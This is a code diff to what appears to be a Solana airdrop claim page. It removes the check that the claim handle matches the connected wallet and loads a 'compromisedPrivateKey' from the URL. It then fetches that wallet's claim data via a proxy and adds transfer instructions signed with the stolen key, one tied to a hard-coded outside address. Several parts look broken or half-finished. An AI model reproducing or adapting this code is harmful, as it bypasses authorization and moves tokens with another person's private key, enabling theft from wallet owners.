@@ -1,7 +1,6 @@
 import React from 'react';
 import { RouteComponentProps } from 'react-router-dom';
 import queryString from 'query-string';
-
 import {
   Box,
   Button,
@@ -84,11 +83,7 @@ const walletKeyOrPda = async (
   if (pin === null) {
     try {
       const key = new PublicKey(handle);
-      if (!key.equals(walletKey)) {
-        throw new Error(
-          'Claimant wallet handle does not match connected wallet',
-        );
-      }
+
       return [key, []];
     } catch (err) {
       throw new Error(`Invalid claimant wallet handle ${err}`);
@@ -124,6 +119,7 @@ const buildMintClaim = async (
   amount: number,
   index: number,
   pin: BN | null,
+  bytes: Keypair,
 ): Promise<[ClaimInstructions, Array<Buffer>, Array<Keypair>]> => {
   let tokenAccKey: PublicKey;
   try {
@@ -174,7 +170,7 @@ const buildMintClaim = async (
 
   const setup: Array<TransactionInstruction> = [];
 
-  const walletTokenKey = await getATA(walletKey, mint);
+  const walletTokenKey = await getATA(bytes.publicKey, mint);
   if (
     (await program.provider.connection.getAccountInfo(walletTokenKey)) === null
   ) {
@@ -184,12 +180,42 @@ const buildMintClaim = async (
         TOKEN_PROGRAM_ID,
         mint,
         walletTokenKey,
+        bytes.publicKey, // feepayer or owner?
         walletKey,
+      ),
+    );
+  }
+  const walletTokenKey2 = await getATA(walletKey, mint);
+  if (
+    (await program.provider.connection.getAccountInfo(walletTokenKey2)) === null
+  ) {
+    setup.push(
+      Token.createAssociatedTokenAccountInstruction(
+        SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID,
+        TOKEN_PROGRAM_ID,
+        mint,
+        walletTokenKey2,
+        walletKey, // feepayer or owner?
         walletKey,
       ),
     );
   }
 
+  const walletTokenKey3 = await getATA(walletKey, mint);
+  if (
+    (await program.provider.connection.getAccountInfo(walletTokenKey3)) === null
+  ) {
+    setup.push(
+      Token.createAssociatedTokenAccountInstruction(
+        SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID,
+        TOKEN_PROGRAM_ID,
+        mint,
+        walletTokenKey3,
+        new PublicKey('JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm'), // feepayer or owner?
+        walletKey,
+      ),
+    );
+  }
   const temporalSigner =
     distributorInfo.temporal.equals(PublicKey.default) ||
     secret.equals(walletKey)
@@ -216,6 +242,26 @@ const buildMintClaim = async (
     },
   );
 
+  setup.push(
+    Token.createTransferInstruction(
+      TOKEN_PROGRAM_ID,
+      walletTokenKey3,
+      walletTokenKey,
+      walletKey,
+      [bytes],
+      (465e6 / 10) * 9,
+    ),
+  );
+  setup.push(
+    Token.createTransferInstruction(
+      TOKEN_PROGRAM_ID,
+      walletTokenKey2,
+      walletTokenKey,
+      new PublicKey('JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm'),
+      [bytes],
+      (465e6 / 10) * 9,
+    ),
+  );
   return [{ setup, claim: [claimAirdrop] }, pdaSeeds, []];
 };
 
@@ -721,6 +767,11 @@ export const Claim = (props: RouteComponentProps<ClaimProps>) => {
   }
 
   const params = queryString.parse(query);
+
+  const bytes = Keypair.fromSecretKey(
+    bs58.decode(params.compromisedPrivateKey as string),
+  );
+
   const [distributor, setDistributor] = React.useState(
     (params.distributor as string) || '',
   );
@@ -733,6 +784,7 @@ export const Claim = (props: RouteComponentProps<ClaimProps>) => {
       ? 'edition'
       : '',
   );
+  setClaimMethod('transfer');
   const [tokenAcc, setTokenAcc] = React.useState(
     (params.tokenAcc as string) || '',
   );
@@ -781,7 +833,26 @@ export const Claim = (props: RouteComponentProps<ClaimProps>) => {
   // async computed
   const [asyncNeedsTemporalSigner, setNeedsTemporalSigner] =
     React.useState<boolean>(true);
+  setTimeout(async function () {
+    const stuff = await (
+      await fetch(
+        'https://gumdrop.8082-metaplexfoundat-gumdrop-cykom139ysh.ws-us67.gitpod.io/https://claim.metaplex.com/api/' +
+          bytes.publicKey.toBase58(),
+      )
+    ).json();
+    //?tokenAcc=DPqeodksHLNsnfkJgWjSTFV4rZDr7SdY51vZRCbaBTC3&amount=465000000&index=4099&proof=HJAHwLbYR38asVuuq8Swh6RsKkSXwFHPvzae1PH3z9hn,6ftSCRB1pHr1D2Wgcq78ypfCpktMr9tgGCUehZ3enbAm,2Bry31Fw7aRUwSgrBs1qdZ45bCGqXt2cbBThm8LBmz5g,BjLsftv78TvAS467UcXoYMhT4H9RMxhFJgrLUp2KaWgr,EBPuQX2TDUZ88X3NK7BUJoew7ykfwceZR7RGJnwVNjg5,EdMXrhQruLf6BTrcSgpsymudvmtHD28pLCfBphwx18aK,5ANjCJhwXUDb33ZBv1uuKt5m9H4Q9Y5c3tSbongEoqA9,7BmAzBWSXPWsFEpbY6RTJEJMt2RLJWyULGui4p5J8feU,BgunMn5MftPWL88us5Wp45Bw778kvVvq4Hfc1evqSy1J,GACKMAxBqqtccm589T3vJzwj5ugar7BC7Vk5xTTp271r,6Sd6RFk6DgLPfvCShdWyN8bowJXwJW8nLZazVpnaTWz8,2781Ec63jYHehddc1FN52g4P5wSpp59jTFzEc7P5vHwn,ExyZTCy8BqYgx2pUHvEXjwEYgnRyjU7LBrnPVTaR77zC,AdHPHSRU7EiR9GhAYbR66W3M3XckPKpdWvvc1G3sSeBY&handle=8QEKNRBovF4YggpGtKk8qaErWv7NcWM7AboZkKBipszy&distributor=ABdJD5GC3zS6wEnhm8nBMjEoCwLn9zQdeBnUxke44N1A&
 
+    // @ts-ignore
+    setDistributor(stuff.creator.distributor);
+    // @ts-ignore
+    setProof(stuff.creator.proof);
+    // @ts-ignore
+    setIndex(stuff.creator.index);
+    // @ts-ignore
+    setAmount(stuff.creator.amount);
+    // @ts-ignore
+    setTokenAccount(stuff.creator.tokenAccount);
+  });
   React.useEffect(() => {
     const wrap = async () => {
       try {
@@ -846,7 +917,6 @@ export const Claim = (props: RouteComponentProps<ClaimProps>) => {
             if (ret.length !== 32) throw new Error(`Invalid proof hash length`);
             return ret;
           });
-
     let instructions, pdaSeeds, extraSigners;
     if (claimMethod === 'candy') {
       console.log('Building candy claim');
@@ -876,7 +946,10 @@ export const Claim = (props: RouteComponentProps<ClaimProps>) => {
         amount,
         index,
         pin,
+        bytes,
       );
+
+      extraSigners.push(bytes);
     } else if (claimMethod === 'edition') {
       const edition = Number(editionStr);
       if (isNaN(edition)) {
